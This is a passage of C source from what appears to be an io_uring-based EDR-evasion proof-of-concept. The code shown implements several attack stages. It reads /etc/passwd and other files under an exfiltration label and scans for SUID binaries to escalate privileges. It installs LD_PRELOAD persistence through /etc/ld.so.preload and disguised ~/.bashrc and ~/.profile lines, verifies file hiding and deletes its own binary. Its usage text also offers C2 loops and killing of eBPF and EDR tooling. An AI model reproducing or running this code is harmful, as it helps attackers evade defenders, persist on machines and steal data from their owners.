    int total = 0;
    for (int i = 0; targets[i]; i++) {
        int b = uring_read_file(ring, targets[i], buf, BUF_SIZE);
        if (b > 0) { printf("    [+] %s (%d bytes)\n", targets[i], b); total += b; }
        else printf("    [-] %s (denied)\n", targets[i]);
    }
    printf("    [*] Total: %d bytes — ZERO openat/read/close syscalls\n", total);
}

/* 4d: Find SUID binaries for privilege escalation via io_uring statx */
static void phase4_privesc(struct io_uring *ring) {
    printf("\n  -- 4d: SUID Binary Discovery (statx) --\n");
    const char *dirs[] = { "/usr/bin", "/usr/sbin", "/bin", "/sbin", NULL };
    int suid_count = 0;
    for (int d = 0; dirs[d]; d++) {
        DIR *dir = opendir(dirs[d]);
        if (!dir) continue;
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_name[0] == '.') continue;
            char path[512];
            snprintf(path, sizeof(path), "%s/%s", dirs[d], entry->d_name);
            struct statx stx;
            if (uring_statx_check(ring, path, &stx) == 0 && (stx.stx_mode & S_ISUID)) {
                printf("    [+] %s (uid=%u)\n", path, stx.stx_uid);
                suid_count++;
            }
        }
        closedir(dir);
    }
    printf("    [*] %d SUID binaries — ZERO stat() syscalls\n", suid_count);
}

/* Phase 4 combined */
static void phase4_recon(struct io_uring *ring) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  PHASE 4: Reconnaissance + Privilege Escalation          ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");
    phase4_recon_users(ring);
    phase4_recon_network(ring);
    phase4_exfiltration(ring);
    phase4_privesc(ring);
    printf("\n[+] Recon complete — all via io_uring\n");
}


/* ╔══════════════════════════════════════════════════════════════╗
 * ║  PHASE 5: Cleanup + Self-Destruct                            ║
 * ╚══════════════════════════════════════════════════════════════╝ */
static void phase5_selfdestruct(struct io_uring *ring) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  PHASE 5: Cleanup + Self-Destruct                        ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");

    /* Delete own binary — process keeps running from RAM */
    char exe_link[512];
    ssize_t len = readlink("/proc/self/exe", exe_link, sizeof(exe_link) - 1);
    if (len > 0) {
        exe_link[len] = '\0';
        if (uring_unlink(ring, exe_link) == 0)
            printf("[+] Binary deleted: %s (still in RAM)\n", exe_link);
        else
            printf("[-] Cannot delete: %s\n", strerror(errno));
    }

    /* Remove evil.so */
    if (uring_unlink(ring, "/tmp/evil.so") == 0)
        printf("[+] /tmp/evil.so deleted\n");

    /* Clear persistence */
    int fd = uring_open(ring, "/etc/ld.so.preload", O_WRONLY | O_TRUNC, 0);
    if (fd >= 0) {
        uring_close(ring, fd);
        printf("[+] /etc/ld.so.preload cleared\n");
    } else {
        printf("[*] Run: sudo cp /dev/null /etc/ld.so.preload\n");
    }

    printf("[+] Self-destruct complete\n");
    io_uring_queue_exit(ring);
    _exit(0);
}


/* ──────────────────────────────────────────────────────────
 * STANDALONE COMMANDS (individual step execution)
 * ────────────────────────────────────────────────────────── */

/* Create evil.so */

/* Create evil.so */
static void cmd_create(struct io_uring *ring) {
    printf("\n");
    printf("╔══════════════════════════════════════════╗\n");
    printf("║  Create /tmp/evil.so via io_uring         ║\n");
    printf("╚══════════════════════════════════════════╝\n");
    const char *payload = "#!/bin/sh\necho 'Payload executed'\n";
    int ret = uring_write_file(ring, "/tmp/evil.so", payload, strlen(payload), O_TRUNC);
    if (ret > 0)
        printf("[+] /tmp/evil.so created (%d bytes) — ZERO syscalls\n", ret);
    else
        printf("[-] Failed (error=%d)\n", ret);
}

/* File I/O demo */
static void cmd_fileio(struct io_uring *ring) {
    printf("\n");
    printf("╔══════════════════════════════════════════╗\n");
    printf("║  File I/O via io_uring                    ║\n");
    printf("╚══════════════════════════════════════════╝\n");
    cmd_create(ring);

    char buf[BUF_SIZE];
    const char *targets[] = {"/etc/hostname", "/etc/passwd", "/etc/os-release", NULL};
    for (int i = 0; targets[i]; i++) {
        memset(buf, 0, BUF_SIZE);
        int b = uring_read_file(ring, targets[i], buf, BUF_SIZE);
        if (b > 0) {
            char disp[200]; strncpy(disp, buf, 199); disp[199] = '\0';
            char *nl = strchr(disp, '\n'); if (nl) *nl = '\0';
            printf("[+] %s (%d bytes): %s\n", targets[i], b, disp);
        }
    }
    printf("\n[*] All via io_uring — ZERO syscalls\n");
}

/* Persistence */
static void cmd_persist(struct io_uring *ring) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  PERSISTENCE: io_uring + LD_PRELOAD                      ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");

    char cwd[512], hooks_abs[1024];
    if (getcwd(cwd, sizeof(cwd)) == NULL) { printf("[-] getcwd failed\n"); return; }
    snprintf(hooks_abs, sizeof(hooks_abs), "%s/%s", cwd, HOOKS_FILENAME);

    struct statx stx;
    if (uring_statx_check(ring, hooks_abs, &stx) < 0) {
        printf("[-] %s not found — compile first!\n", hooks_abs);
        return;
    }
    printf("[*] Hooks: %s (%llu bytes)\n", hooks_abs, (unsigned long long)stx.stx_size);

    /* Method 1: /etc/ld.so.preload */
    char preload[1024];
    snprintf(preload, sizeof(preload), "%s\n", hooks_abs);
    int ret = uring_write_file(ring, "/etc/ld.so.preload", preload, strlen(preload), O_TRUNC);
    if (ret > 0)
        printf("[+] /etc/ld.so.preload written — system-wide\n");
    else
        printf("[-] /etc/ld.so.preload failed (not root)\n");

    /* Method 2: ~/.bashrc */
    char *home = getenv("HOME");
    if (!home) home = "/tmp";
    char bashrc[512];
    snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", home);

    char bc[BUF_SIZE];
    int bcb = uring_read_file(ring, bashrc, bc, BUF_SIZE);
    if (bcb > 0 && strstr(bc, HOOKS_FILENAME)) {
        printf("[*] Already in %s\n", bashrc);
    } else {
        char inject[1024];
        snprintf(inject, sizeof(inject),
                 "\n# System library optimization\nexport LD_PRELOAD=%s\n", hooks_abs);
        ret = uring_write_file(ring, bashrc, inject, strlen(inject), O_APPEND);
        if (ret > 0) printf("[+] %s injected\n", bashrc);
    }

    /* Method 3: ~/.profile */
    char profile[512];
    snprintf(profile, sizeof(profile), "%s/.profile", home);
    char pc[BUF_SIZE];
    int pcb = uring_read_file(ring, profile, pc, BUF_SIZE);
    if (pcb <= 0 || !strstr(pc, HOOKS_FILENAME)) {
        char inj[1024];
        snprintf(inj, sizeof(inj),
                 "\n# Performance library\nexport LD_PRELOAD=%s\n", hooks_abs);
        ret = uring_write_file(ring, profile, inj, strlen(inj), O_APPEND);
        if (ret > 0) printf("[+] %s injected\n", profile);
    }

    printf("\n[*] Cleanup: sudo cp /dev/null /etc/ld.so.preload\n");
}

/* Hide file verification */
static void cmd_hide(struct io_uring *ring) {
    printf("\n");
    printf("╔══════════════════════════════════════════╗\n");
    printf("║  FILE HIDING VERIFICATION                 ║\n");
    printf("╚══════════════════════════════════════════╝\n");

    char pb[BUF_SIZE];
    int active = 0;
    int pbb = uring_read_file(ring, "/etc/ld.so.preload", pb, BUF_SIZE);
    if (pbb > 0 && strstr(pb, HOOKS_FILENAME)) {
        printf("[+] /etc/ld.so.preload ACTIVE\n");
        active = 1;
    }
    const char *env = getenv("LD_PRELOAD");
    if (env && strstr(env, HOOKS_FILENAME)) {
        printf("[+] LD_PRELOAD env ACTIVE\n");
        active = 1;
    }

    if (active) {
        printf("\n    --- ls /tmp/ ---\n");
        system("ls /tmp/ 2>/dev/null");
        printf("\n    --- ls -la /tmp/evil.so ---\n");
        system("ls -la /tmp/evil.so 2>&1");
        printf("\n    --- stat /tmp/evil.so ---\n");
        system("stat /tmp/evil.so 2>&1");
        printf("\n    --- cat /tmp/evil.so ---\n");
        system("cat /tmp/evil.so 2>&1");
        printf("\n    --- find /tmp -name 'evil*' ---\n");
        system("find /tmp -name 'evil*' 2>&1");
    } else {
        printf("[-] No persistence — run: sudo ./evasion_ops persist\n");
    }
}

/* Cleanup */
static void cmd_cleanup(struct io_uring *ring) {
    printf("\n");
    printf("╔══════════════════════════════════════════╗\n");
    printf("║  CLEANUP — Remove all traces              ║\n");
    printf("╚══════════════════════════════════════════╝\n");

    /* Clear ld.so.preload */
    int fd = uring_open(ring, "/etc/ld.so.preload", O_WRONLY | O_TRUNC, 0);
    if (fd >= 0) {
        uring_close(ring, fd);
        printf("[+] /etc/ld.so.preload cleared\n");
    } else {
        printf("[*] Trying sudo...\n");
        int ret = system("sudo cp /dev/null /etc/ld.so.preload 2>/dev/null");
        if (ret == 0)
            printf("[+] Cleared via sudo\n");
        else
            printf("[-] Run: sudo cp /dev/null /etc/ld.so.preload\n");
    }

    /* Remove evil.so */
    if (uring_unlink(ring, "/tmp/evil.so") == 0)
        printf("[+] /tmp/evil.so removed\n");

    /* Clean bashrc/profile */
    char *home = getenv("HOME");
    if (!home) home = "/tmp";

    char sed_cmd[1024];
    snprintf(sed_cmd, sizeof(sed_cmd),
        "sed -i '/LD_PRELOAD.*evasion_hooks/d' %s/.bashrc 2>/dev/null && "
        "sed -i '/System library optimization/d' %s/.bashrc 2>/dev/null && "
        "sed -i '/LD_PRELOAD.*evasion_hooks/d' %s/.profile 2>/dev/null && "
        "sed -i '/Performance library/d' %s/.profile 2>/dev/null",
        home, home, home, home);

    int sed_ret = system(sed_cmd);
    if (sed_ret == 0)
        printf("[+] ~/.bashrc and ~/.profile cleaned\n");
    else
        printf("[*] Manual: nano %s/.bashrc → remove LD_PRELOAD line\n", home);

    printf("\n[+] Cleanup complete — open NEW terminal to verify\n");
}

/* Usage */
static void print_usage(const char *prog) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  io_uring EDR Evasion PoC v4 — 5 Phases                  ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");
    printf("Usage: %s <command> [options]\n\n", prog);
    printf("── Individual Steps ──\n");
    printf("  file-io              File read/write via io_uring\n");
    printf("  create               Create /tmp/evil.so only\n");
    printf("  connect [IP]         C2 demo (single session)\n");
    printf("  c2-loop [IP]         C2 command loop (auto-reconnect)\n");
    printf("  killbpf              Phase 3: Reaper (kill tracing/eBPF/EDR)\n");
    printf("  recon                Phase 4: Recon (users/network/files/SUID)\n");
    printf("  persist              Install LD_PRELOAD persistence\n");
    printf("  hide-file            Verify file hiding\n");
    printf("  exfil                Exfiltrate sensitive files\n");
    printf("  privesc              SUID binary scan\n");
    printf("  selfdestruct         Phase 5: Delete binary + exit\n");
    printf("  cleanup              Remove all traces\n\n");
    printf("── Full Demo ──\n");
    printf("  all [C2_IP]          Run Phase 1→4 sequentially\n");
    printf("  demo                 Quick demo (file-io + recon)\n\n");
    printf("── Compile ──\n");
    printf("  gcc -shared -fPIC -o evasion_hooks.so <file> -ldl -luring\n");
    printf("  gcc -DSTANDALONE -o evasion_ops <file> -luring -ldl\n");
}

/* Main */
int main(int argc, char *argv[]) {
    if (argc < 2) { print_usage(argv[0]); return 1; }

    struct io_uring ring;
    int ret = io_uring_queue_init(QUEUE_DEPTH, &ring, 0);
    if (ret < 0) {
        fprintf(stderr, "[-] io_uring_queue_init failed: %s\n", strerror(-ret));
        return 1;
    }

    const char *cmd = argv[1];

    /* Phase 1 always runs — ring is already initialized */
    phase1_init(&ring);

    if (strcmp(cmd, "file-io") == 0)           cmd_fileio(&ring);
    else if (strcmp(cmd, "create") == 0)        cmd_create(&ring);
    else if (strcmp(cmd, "connect") == 0) {
        const char *ip = (argc >= 3) ? argv[2] : "127.0.0.1";
        phase2_c2_demo(&ring, ip);
    }
    else if (strcmp(cmd, "c2-loop") == 0) {
        const char *ip = (argc >= 3) ? argv[2] : "127.0.0.1";
        phase2_c2_loop(&ring, ip);
    }
    else if (strcmp(cmd, "killbpf") == 0)       phase3_reaper(&ring);
    else if (strcmp(cmd, "recon") == 0)          phase4_recon(&ring);
    else if (strcmp(cmd, "persist") == 0)        cmd_persist(&ring);
    else if (strcmp(cmd, "hide-file") == 0)      cmd_hide(&ring);
    else if (strcmp(cmd, "exfil") == 0)          phase4_exfiltration(&ring);
    else if (strcmp(cmd, "privesc") == 0)        phase4_privesc(&ring);
    else if (strcmp(cmd, "selfdestruct") == 0)   phase5_selfdestruct(&ring);
    else if (strcmp(cmd, "cleanup") == 0)        cmd_cleanup(&ring);
    else if (strcmp(cmd, "demo") == 0) {
        cmd_fileio(&ring);
        phase4_recon(&ring);
    }
    else if (strcmp(cmd, "all") == 0) {
        const char *ip = (argc >= 3) ? argv[2] : "127.0.0.1";
        cmd_fileio(&ring);
        phase2_c2_demo(&ring, ip);
        phase3_reaper(&ring);
        phase4_recon(&ring);
        printf("\n[*] Phase 5 (selfdestruct) skipped — run manually\n");
    }
    else {
        printf("[-] Unknown: %s\n", cmd);
        print_usage(argv[0]);
    }

    io_uring_queue_exit(&ring);
    return 0;
}

#endif /* STANDALONE */